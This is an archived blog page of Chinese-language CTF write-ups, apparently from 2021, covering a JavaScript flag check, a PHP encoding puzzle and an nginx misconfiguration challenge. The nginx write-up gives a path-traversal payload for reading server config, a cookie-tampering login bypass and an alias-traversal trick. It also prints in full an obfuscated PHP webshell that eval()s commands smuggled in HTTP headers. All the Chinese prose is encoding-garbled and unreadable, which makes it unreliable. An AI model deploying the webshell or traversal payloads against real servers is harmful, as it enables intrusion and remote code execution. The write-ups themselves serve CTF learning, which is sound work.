<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> e = <span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">	<span class="keyword">if</span> (e.length == <span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> (e.match(<span class="regexp">/^be0f23/</span>) != <span class="literal">null</span>)</span><br><span class="line">			<span class="keyword">if</span> (e.match(<span class="regexp">/233ac/</span>) != <span class="literal">null</span>)</span><br><span class="line">				<span class="keyword">if</span> (e.match(<span class="regexp">/e98aa$/</span>) != <span class="literal">null</span>)</span><br><span class="line">					<span class="keyword">if</span> (e.match(<span class="regexp">/c7be9/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">						<span class="keyword">var</span> t = [<span class="string">&quot;fl&quot;</span>, <span class="string">&quot;s_a&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> n = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;_h0l&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> r = [<span class="string">&quot;g&#123;&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_0&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> i = [<span class="string">&quot;it&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> s = [t, n, r, i];</span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">13</span>; ++o) &#123;</span><br><span class="line">							<span class="built_in">document</span>.write(s[o % <span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">							s[o % <span class="number">4</span>].splice(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>

<p>æ»¡è¶³æ¡ä»¶åè®¡ç®—å‡ºflagï¼Œæ¡ä»¶åº”è¯¥æ˜¯éœ€è¦æ‹¼æ¥çš„ï¼Œè®¡ç®—éƒ¨åˆ†å¯¼å…¥æ§åˆ¶å°å‡ºç»“æœï¼š</p>
<p><img src="D:\HexoBlog\source\images\NaNNaNNaNNaN-Batman\image-20210318175207495.png" alt="image-20210318175207495"></p>
<blockquote>
<p>â€¦â€¦</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/web2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/web2/" class="post-title-link" itemprop="url">web2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-18 16:22:55 / ä¿®æ”¹æ—¶é—´ï¼š16:26:57" itemprop="dateCreated datePublished" datetime="2021-03-18T16:22:55+08:00">2021-03-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h5><h6 id="1-é¢˜ç›®"><a href="#1-é¢˜ç›®" class="headerlink" title="1.é¢˜ç›®"></a>1.é¢˜ç›®</h6><h6 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥äº¤ä»£äº†æºç ï¼Œçœ‹è¿‡ä¸Šä¸€ä¸ªæ··æ·†ï¼Œè¿™ä¸ªçœ‹ç€å°±é¡ºçœ¼å¤šäº†</p>
<p>æ ¹æ®ä»£ç ï¼Œå…³é”®ä¹Ÿå°±æ˜¯æˆªå–å­—ç¬¦ä½¿ASCIIç§»ä½ï¼Œæœ€årot13ï¼Œbase64â€¦â€¦</p>
<p>è§£å¯†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">	$_o=base64_decode(strrev(str_rot13($str)));</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">	$_=strrev($_);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> $_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decode($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/web2/image-20210318162648203.png" alt="image-20210318162648203"></p>
<p>okâ€¦â€¦</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/Web-php-wrong-nginx-config/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/Web-php-wrong-nginx-config/" class="post-title-link" itemprop="url">Web_php_wrong_nginx_config</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-18 14:57:33 / ä¿®æ”¹æ—¶é—´ï¼š16:12:16" itemprop="dateCreated datePublished" datetime="2021-03-18T14:57:33+08:00">2021-03-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h4><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ‹¿å¾¡å‰‘æ‰«ä¸€ä¸‹ï¼š</p>
<img src="/images/Web-php-wrong-nginx-config/image-20210318150302083.png" alt="image-20210318150302083" style="zoom:80%;" />

<p>å‡ºæ¥å¾ˆå¤šï¼Œä½†åªæœ‰adminç®¡ç”¨â€¦â€¦</p>
<p>adminæœ‰ä¸€ä¸ªplease continueâ€¦â€¦æ‰‹åŠ¨å‘ç°robots.txtâ€¦â€¦æ„£æ˜¯æ‰«ä¸å‡ºæ¥</p>
<p>ï¼šhints.php Hack.php</p>
<p>hintså‘Šè¯‰æˆ‘ä»¬</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318150619914.png" alt="image-20210318150619914"></p>
<p>åº”è¯¥æœ‰ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„éƒ¨åˆ†â€¦â€¦</p>
<p>æŠ“åŒ…ï¼Œcookieé‡Œæœ‰ä¸€ä¸ªisLogin=0ï¼Œæ”¹æˆ1è¿›å…¥äº†ç½‘ç«™é¡µé¢ï¼š</p>
<img src="/images/Web-php-wrong-nginx-config/image-20210318150825792.png" alt="image-20210318150825792" style="zoom:80%;" />

<p>ç®¡ç†ä¸­å¿ƒé¡µé¢ï¼š<img src="/images/Web-php-wrong-nginx-config/image-20210318150858928.png" alt="image-20210318150858928" style="zoom:80%;" /></p>
<p>è¿™é‡Œåº”è¯¥å¯ä»¥è¯»å–é…ç½®æ–‡ä»¶â€¦â€¦è¯»ä¸å‡ºæ¥ï¼ŒåŸæ¥æ˜¯è¿‡æ»¤äº†../  </p>
<p>åŒå†™ï¼š</p>
<p><code>?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=</code></p>
<p>è¯»å–ï¼š</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318151131711.png" alt="image-20210318151131711"></p>
<p>æŒ‰ç…§æç¤ºè¯´çš„ï¼Œåº”è¯¥æ˜¯Nginxçš„é…ç½®æ–‡ä»¶ï¼Œç”¨<strong>nginx-config-formatter-master</strong>æ•´ç†ä»£ç ï¼š</p>
<blockquote>
<p>python nginxfmt.py [filename.conf]</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>;</span><br><span class="line">    <span class="comment">## listen for ipv4;</span></span><br><span class="line">    <span class="attribute">this</span> line is default and implied listen [::]:<span class="number">8080</span>;</span><br><span class="line">    <span class="comment">## listen for ipv6 root /var/www/html;</span></span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line">    <span class="attribute">port_in_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/ #server_name localhost;</span></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile if ($time_iso8601 ~ &quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;) &#123; set $year $1;</span></span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$month</span> <span class="variable">$2</span>;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$day</span> <span class="variable">$3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off;</span></span><br><span class="line"><span class="attribute">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$http_x_forwarded_for_filt</span> <span class="regexp">~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+)</span> &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$1</span>???;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span></span><br><span class="line"><span class="attribute">error_log</span> /var/log/nginx/error.log <span class="literal">info</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"><span class="comment"># redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html;</span></span><br><span class="line"><span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?q=<span class="variable">$uri</span>&amp;<span class="variable">$args</span>;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php5.6-fpm.sock;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_NAME <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> REMOTE_ADDR <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /\.</span> &#123;</span><br><span class="line">    <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /web-img &#123;</span><br><span class="line">    <span class="attribute">alias</span> /images/;</span><br><span class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(ini|docx|pcapng|doc)$</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">include</span> /var/www/nginx[.]conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>locationè¿™é‡Œå°±æ˜¯å¤„ç†è·¯ç”±ï¼Œlocationæ˜ç¡®ä¸åŒçš„èŠ‚ç‚¹è¯¥å¦‚ä½•å¤„ç†ï¼š</p>
<blockquote>
<p>deny all å³æ‹’ç»è®¿é—®ã€‚ä¹Ÿå¯ä»¥allowæŒ‡å®šIPè®¿é—®</p>
<p><strong>rootï¼š</strong></p>
<p>location /i/ {</p>
<p>root /data/w3;      </p>
<p> }</p>
<p>rootçš„å¤„ç†ç»“æœæ˜¯ï¼šrootè·¯å¾„ï¼‹locationè·¯å¾„</p>
<p>è¯·æ±‚ <code>http://xxxx/i/top.gif </code>è¿™ä¸ªåœ°å€æ—¶ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡å™¨é‡Œé¢å¯¹åº”çš„çœŸæ­£çš„èµ„æºæ˜¯<code> /data/w3/i/top.gif</code>æ–‡ä»¶</p>
<p><strong>aliasï¼š</strong></p>
<p>location /i/ {</p>
<p>alias /data/w3/;   </p>
<p>}</p>
<p>aliasçš„å¤„ç†ç»“æœæ˜¯ï¼šä½¿ç”¨aliasè·¯å¾„æ›¿æ¢locationè·¯å¾„</p>
<p>åŒæ ·è¯·æ±‚ <code>http://foofish.net/i/top.gif</code> æ—¶ï¼Œåœ¨æœåŠ¡å™¨æŸ¥æ‰¾çš„èµ„æºè·¯å¾„æ˜¯ï¼š<code> /data/w3/top.gif</code>ï¼Œå› ä¸ºaliasä¼šæŠŠlocationåé¢é…ç½®çš„è·¯å¾„ä¸¢å¼ƒæ‰ï¼ŒæŠŠå½“å‰åŒ¹é…åˆ°çš„ç›®å½•æŒ‡å‘åˆ°æŒ‡å®šçš„ç›®å½•ã€‚</p>
</blockquote>
<p>å°½ç®¡ç»å¤§éƒ¨åˆ†é…ç½®éƒ½çœ‹ä¸æ‡‚ï¼Œä½†çŸ¥é“æœ‰ä¸€ä¸ª/web-imgçš„è·¯å¾„ï¼Œè½¬åˆ°æ ¹ç›®å½•çš„/imagesä¸­å»â€¦â€¦</p>
<p>è€Œaliasä¸‹çš„æ˜¯ï¼š <strong>autoindex on;</strong></p>
<blockquote>
<p>Nginxé»˜è®¤æ˜¯ä¸å…è®¸åˆ—å‡ºæ•´ä¸ªç›®å½•çš„</p>
<p>å¦‚éœ€æ­¤åŠŸèƒ½ï¼Œæ‰“å¼€nginx.confæ–‡ä»¶ï¼Œåœ¨location server æˆ– httpæ®µä¸­åŠ å…¥<strong>autoindex on</strong>ï¼›</p>
<p>ä¹Ÿå°±æ˜¯è®¿é—®è¿™ä¸ªç½‘é¡µå¯ä»¥å®ç°ç½‘ç«™ç›®å½•éå†</p>
</blockquote>
<p>è®¿é—®ï¼š<a target="_blank" rel="noopener" href="http://111.200.241.244:58533/web-img/">http://111.200.241.244:58533/web-img/</a></p>
<img src="/images/Web-php-wrong-nginx-config/image-20210318153058090.png" alt="image-20210318153058090" style="zoom:80%;" />

<p>è¯¥ç›®å½•ä¸‹æ²¡æœ‰ä»€ä¹ˆæ–‡ä»¶ï¼Œè®¿é—®/web-img../ç›¸å½“äº/images/../ï¼Œå¯ä»¥è¯»åˆ°ä¸Šå±‚çš„ç›®å½•</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160059239.png" alt="image-20210318160059239"></p>
<p>å‘ç°hack.php.bakä¸‹è½½è¯»å–ï¼š</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160147928.png" alt="image-20210318160147928"></p>
<p>phpæ··æ·†â€¦â€¦ç¦»è°±</p>
<p>è§‚å¯Ÿä¸€ä¸‹ï¼Œå…³é”®æ˜¯åˆ©ç”¨$fåˆ›å»ºäº†ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å‡ºfå¹¶æ ¼å¼åŒ–ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$kh=<span class="string">&quot;42f7&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>) </span>&#123;</span><br><span class="line">	$c=strlen($k);</span><br><span class="line">	$l=strlen($t);</span><br><span class="line">	$o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">		<span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">			$o.=$t &#123;</span><br><span class="line">				$i</span><br><span class="line">			&#125;</span><br><span class="line">			^$k &#123;</span><br><span class="line">				$j</span><br><span class="line">			&#125;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">	$u=parse_url($rr);</span><br><span class="line">	parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">	$q=array_values($q);</span><br><span class="line">	preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">	<span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		$s=&amp;$_SESSION;</span><br><span class="line">		$ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">		$sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">		$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">		$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">		<span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">			$s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">			$p=$ss($p,<span class="number">3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">			$s[$i].=$p;</span><br><span class="line">			$e=strpos($s[$i],$f);</span><br><span class="line">			<span class="keyword">if</span>($e) &#123;</span><br><span class="line">				$k=$kh.$kf;</span><br><span class="line">				ob_start();</span><br><span class="line">				@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">				$o=ob_get_contents();</span><br><span class="line">				ob_end_clean();</span><br><span class="line">				$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">				<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">				@session_destroy();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¦»è°±ï¼Œphpæ··æ·†çš„ä»£ç ï¼Œåé¢æœ‰ä¸ªevalï¼Œå¤§æ¦‚æ˜¯ä¸€ä¸ªé©¬â€¦â€¦</p>
<p>æˆ‘å¤ªèœäº†ï¼Œçœ‹ä¸åŠ¨â€¦â€¦</p>
<p>dalaoï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/107801811">https://blog.csdn.net/weixin_44604541/article/details/107801811</a></p>
<p>dalaoç«Ÿç„¶å†™äº†å¯äº¤äº’çš„è„šæœ¬â€¦â€¦ç¦»è°±ï¼š</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160642217.png" alt="image-20210318160642217"></p>
<p>tql</p>
<blockquote>
<p>â€¦â€¦wohaocai</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/Nginx%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/Nginx%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">Nginxå…¥é—¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
